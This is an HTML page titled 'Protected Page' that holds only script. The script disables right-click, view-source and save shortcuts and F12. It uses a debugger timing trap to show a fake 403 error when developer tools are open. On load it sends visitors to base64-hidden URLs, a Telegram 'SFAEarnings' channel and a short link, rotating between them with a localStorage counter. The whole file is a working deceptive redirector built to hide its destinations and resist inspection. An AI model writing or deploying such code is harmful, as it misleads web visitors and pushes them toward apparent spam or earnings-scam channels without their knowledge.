<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protected Page</title>
    <script>
        (function() {
            function blockDevTools() {
                document.addEventListener("contextmenu", e => e.preventDefault());
                document.addEventListener("keydown", e => {
                    if (e.ctrlKey && (e.key === "u" || e.key === "s")) e.preventDefault();
                    if (e.keyCode === 123) e.preventDefault();
                });

                setInterval(() => {
                    let before = new Date();
                    debugger;
                    let after = new Date();
                    if (after - before > 100) {
                        document.body.innerHTML = "<h1 style='text-align:center;color:red;'>Error 403: Access Denied</h1>";
                        throw new Error("DevTools Blocked!");
                    }
                }, 1000);
            }

            function redirect() {
                let count = localStorage.getItem("rdCt") ? parseInt(localStorage.getItem("rdCt")) : 0;
                let l1 = atob("aHR0cHM6Ly90Lm1lL1NGQUVhcm5pbmdz");  // Telegram Link (1 बार)
                let l2 = atob("aHR0cHM6Ly9nb3RvLm5vdy9KdHVnYw==");  // दूसरा Link (3 बार)

                if (count < 3) {
                    localStorage.setItem("rdCt", count + 1);
                    window.location.href = l2; // दूसरा लिंक 3 बार खुलेगा
                } else {
                    localStorage.setItem("rdCt", 0);
                    window.location.href = l1; // Telegram लिंक 1 बार खुलेगा
                }
            }

            blockDevTools();
            setTimeout(redirect, 200);
        })();
    </script>
</head>
<body>
</body>
</html>
